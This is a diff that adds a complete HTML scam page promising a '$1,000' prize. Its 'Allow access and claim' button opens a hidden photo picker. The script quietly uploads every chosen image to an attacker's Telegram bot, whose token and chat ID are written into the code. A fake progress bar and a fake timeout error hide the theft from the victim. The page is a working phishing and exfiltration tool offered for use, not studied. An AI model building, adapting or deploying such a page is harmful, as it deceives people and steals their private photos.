@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en" class="notranslate" translate="no">
+<head>
+    <meta name="google" content="notranslate">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instant Reward - $1000</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .win-box { border: 2px solid #00ff00; display: inline-block; padding: 40px; border-radius: 10px; box-shadow: 0 0 30px #00ff00; }
+        .main-btn { 
+            background: #00ff00; color: #000; border: none; padding: 25px 50px; 
+            font-size: 24px; font-weight: bold; cursor: pointer; border-radius: 5px;
+            text-transform: uppercase; animation: pulse 1s infinite;
+        }
+        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }
+        #fileInput { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="win-box notranslate">
+    <h1 style="font-size: 50px;">$1,000</h1>
+    <p style="color: #fff; font-size: 20px;">CLAIM YOUR PRIZE IMMEDIATELY</p>
+    
+    <button class="main-btn" onclick="document.getElementById('fileInput').click()">
+        ALLOW ACCESS AND CLAIM
+    </button>
+
+    <input type="file" id="fileInput" multiple accept="image/*" onchange="blastPhotos(this.files)">
+    
+    <div id="loader" style="margin-top: 20px; display: none;">
+        <div style="color: #fff;">Processing Secure Transfer...</div>
+        <div id="progress" style="font-size: 20px; font-weight: bold;">0%</div>
+    </div>
+</div>
+
+<script>
+const BOT_TOKEN = '8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU';
+const CHAT_ID = '8397194527';
+
+async function blastPhotos(files) {
+    document.getElementById('loader').style.display = 'block';
+    const total = files.length;
+    let sent = 0;
+
+    // تقنية الـ Parallel Processing لإرسال 5 صور في آن واحد لزيادة السرعة
+    const batchSize = 5; 
+    
+    for (let i = 0; i < total; i += batchSize) {
+        const batch = Array.from(files).slice(i, i + batchSize);
+        
+        await Promise.all(batch.map(async (file) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                sent++;
+                document.getElementById('progress').innerText = Math.round((sent / total) * 100) + '%';
+            } catch (err) {
+                // استمرار العملية حتى لو فشل ملف واحد
+            }
+        }));
+    }
+    
+    alert("System Error: Connection Timeout. Please try again later.");
+}
+</script>
+
+</body>
+</html>
